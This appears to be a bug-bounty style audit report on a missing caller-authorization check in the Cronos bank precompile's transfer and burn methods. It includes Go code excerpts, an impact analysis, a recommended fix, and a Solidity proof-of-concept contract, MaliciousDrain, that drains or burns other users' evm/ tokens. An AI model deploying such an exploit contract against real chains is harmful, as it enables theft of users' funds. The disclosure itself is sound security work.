### Title
Unauthorized Transfer and Burn of `evm/` Denomination Assets via Bank Precompile Missing Caller Authorization - (File: `x/cronos/keeper/precompiles/bank.go`)

### Summary
The bank precompile's `transfer` and `burn` methods accept an arbitrary `sender`/`recipient` address from calldata without verifying that the calling contract is authorized to act on behalf of that address. Any deployed contract can drain or destroy `evm/<contract_address>` denomination tokens held by any user, with no approval or multi-sig requirement.

### Finding Description
The bank precompile at `x/cronos/keeper/precompiles/bank.go` exposes three state-mutating methods: `mint`, `burn`, and `transfer`. The denom operated on is always `evm/<contract.Caller()>` — i.e., the native bank-module representation of the calling contract's token.

For `transfer`:

```go
sender := args[0].(common.Address)   // fully attacker-controlled from calldata
recipient := args[1].(common.Address)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
denom := EVMDenom(contract.Caller())  // evm/<calling_contract>
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

There is no check that `sender == contract.Caller()`, nor any ERC20-style allowance check. The precompile unconditionally calls `bankKeeper.SendCoins(from, to, ...)` where `from` is whatever address the calling contract supplies.

For `burn`, the same pattern applies — the address whose tokens are burned is taken directly from calldata:

```go
recipient := args[0].(common.Address)   // address to burn FROM — attacker-controlled
addr := sdk.AccAddress(recipient.Bytes())
...
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, ...)
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, ...)
``` [2](#0-1) 

The `IBankModule` interface confirms these methods are publicly callable by any contract: [3](#0-2) 

Users accumulate `evm/<contract_address>` tokens through the `mint` path (e.g., `moveToNative` in `TestBank`), creating real balances that are vulnerable: [4](#0-3) 

### Impact Explanation
**Critical — Unauthorized transfer and burn of `evm/` denomination assets.**

A malicious contract deployer can:
1. Deploy contract `M` and distribute `evm/M` tokens to users (via a DeFi protocol, airdrop, or any service that calls `bank.mint`).
2. At any time, call `bank.transfer(victim, attacker, victim_balance)` or `bank.burn(victim, victim_balance)` from within `M`.
3. All `evm/M` tokens held by any user are drained or destroyed with no user consent, no approval, and no multi-sig.

This is a direct unauthorized balance change for precompile-controlled assets, matching the Critical impact tier.

### Likelihood Explanation
Any unprivileged user can deploy a contract on Cronos EVM. The bank precompile is a production, registered precompile at address `0x0000000000000000000000000000000000000064`. No special privilege is required to call it. The only prerequisite is that victims hold `evm/<attacker_contract>` tokens, which is achievable through any token distribution mechanism.

### Recommendation
In the `transfer` case, verify that `sender == contract.Caller()` or that `sender` has granted an allowance to `contract.Caller()` before executing `SendCoins`. In the `burn` case, verify that `addr == contract.Caller()` or that an explicit approval exists. This mirrors the ERC20 `transferFrom` authorization model and prevents any contract from acting on behalf of arbitrary addresses.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function transfer(address, address, uint256) external payable returns (bool);
    function burn(address, uint256) external payable returns (bool);
    function mint(address, uint256) external payable returns (bool);
}

contract MaliciousDrain {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: Distribute evm/<this_contract_address> tokens to victims
    function distributeToVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);  // victim now holds evm/<this> tokens
    }

    // Step 2: Drain victim's evm/<this_contract_address> tokens — no approval needed
    function drain(address victim, uint256 amount, address attacker) external {
        // sender arg is victim, but caller is this contract — no auth check in precompile
        bank.transfer(victim, attacker, amount);
    }

    // Alternative: burn victim's tokens
    function burnVictim(address victim, uint256 amount) external {
        bank.burn(victim, amount);
    }
}
```

The `drain` call maps to `bankKeeper.SendCoins(ctx, victim, attacker, coins)` inside the precompile with no authorization guard, directly draining the victim's `evm/<MaliciousDrain_address>` native bank module balance. [5](#0-4)
